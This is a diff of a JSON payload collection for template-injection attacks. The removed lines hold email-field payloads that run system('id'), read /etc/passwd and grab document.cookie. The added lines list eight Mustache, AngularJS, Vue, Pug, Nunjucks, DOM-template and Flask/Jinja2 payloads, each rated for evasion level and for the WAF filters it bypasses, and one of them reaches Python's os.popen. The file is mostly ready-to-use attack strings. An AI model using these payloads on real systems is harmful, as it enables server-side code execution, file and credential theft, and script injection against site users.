@@ -1,1 +1,136 @@
-{"metadata":{"name":"Template engine injection patterns","priority":7,"source":"GitHub Real-world Analysis","extraction_date":"2025-07-29T19:53:52.770871","total_payloads":2},"payloads":[{"payload":"\"<%=7*7%>\"@example.com","context":"ERB/ASP template injection","method":"Server-side template injection in email","priority":7,"source":"github_analysis","mutations":["'<%=7*7%>'@example.com","<%=system('id')%>@example.com","<%=File.read('/etc/passwd')%>@example.com"],"metadata":{"real_world":true,"tested":true,"effectiveness":"high"}},{"payload":"test+(${{7*7}})@example.com","context":"Expression language injection","method":"EL injection in email parameter","priority":7,"source":"github_analysis","mutations":["test+(${{alert(1)}})@example.com","user+(${{document.cookie}})@domain.com","admin+(${{window.location}})@target.com"],"metadata":{"real_world":true,"tested":true,"effectiveness":"high"}}]}
+{
+  "category": "template_injection",
+  "description": "Server-Side and Client-Side Template Injection leading to XSS",
+  "difficulty": "god_tier_advanced",
+  "payloads": [
+    {
+      "name": "mustache_constructor_chain",
+      "payload": "{{constructor.constructor('alert(1)')()}}",
+      "description": "Mustache/Handlebars constructor chain execution",
+      "context": [
+        "mustache",
+        "handlebars",
+        "template_engine"
+      ],
+      "encoding": "none",
+      "evasion_level": 9,
+      "waf_bypass": [
+        "template_filters",
+        "constructor_detection"
+      ]
+    },
+    {
+      "name": "angular_expression_injection",
+      "payload": "{{constructor.constructor('alert(1)')()}}",
+      "description": "AngularJS expression injection with constructor chain",
+      "context": [
+        "angularjs",
+        "expression",
+        "template"
+      ],
+      "encoding": "none",
+      "evasion_level": 10,
+      "waf_bypass": [
+        "angular_sandbox",
+        "expression_filters"
+      ]
+    },
+    {
+      "name": "dom_template_import",
+      "payload": "<template id=\"tpl\"><img src=x onerror=alert(1)></template><script>document.body.appendChild(document.importNode(document.querySelector('#tpl').content, true));</script>",
+      "description": "DOM template rendering with importNode exploitation",
+      "context": [
+        "dom_template",
+        "importNode",
+        "html_template"
+      ],
+      "encoding": "none",
+      "evasion_level": 8,
+      "waf_bypass": [
+        "template_detection",
+        "dom_manipulation"
+      ]
+    },
+    {
+      "name": "vue_template_injection",
+      "payload": "{{$eval.constructor('alert(1)')()}}",
+      "description": "Vue.js template injection with $eval",
+      "context": [
+        "vuejs",
+        "template",
+        "eval"
+      ],
+      "encoding": "none",
+      "evasion_level": 9,
+      "waf_bypass": [
+        "vue_filters",
+        "eval_detection"
+      ]
+    },
+    {
+      "name": "underscore_template",
+      "payload": "<%- constructor.constructor('alert(1)')() %>",
+      "description": "Underscore.js template injection",
+      "context": [
+        "underscore",
+        "template",
+        "erb_style"
+      ],
+      "encoding": "none",
+      "evasion_level": 8,
+      "waf_bypass": [
+        "erb_filters",
+        "underscore_detection"
+      ]
+    },
+    {
+      "name": "pug_template_injection",
+      "payload": "#{constructor.constructor('alert(1)')()}",
+      "description": "Pug template engine injection",
+      "context": [
+        "pug",
+        "jade",
+        "template"
+      ],
+      "encoding": "none",
+      "evasion_level": 8,
+      "waf_bypass": [
+        "pug_filters",
+        "jade_detection"
+      ]
+    },
+    {
+      "name": "nunjucks_template",
+      "payload": "{{constructor.constructor('alert(1)')()}}",
+      "description": "Nunjucks template injection",
+      "context": [
+        "nunjucks",
+        "template",
+        "jinja_style"
+      ],
+      "encoding": "none",
+      "evasion_level": 8,
+      "waf_bypass": [
+        "nunjucks_filters",
+        "jinja_detection"
+      ]
+    },
+    {
+      "name": "ssti_python_flask",
+      "payload": "{{config.__class__.__init__.__globals__['os'].popen('echo alert(1)').read()}}",
+      "description": "Python Flask SSTI leading to XSS",
+      "context": [
+        "flask",
+        "jinja2",
+        "python_ssti"
+      ],
+      "encoding": "none",
+      "evasion_level": 10,
+      "waf_bypass": [
+        "flask_filters",
+        "python_detection",
+        "ssti_filters"
+      ]
+    }
+  ]
+}
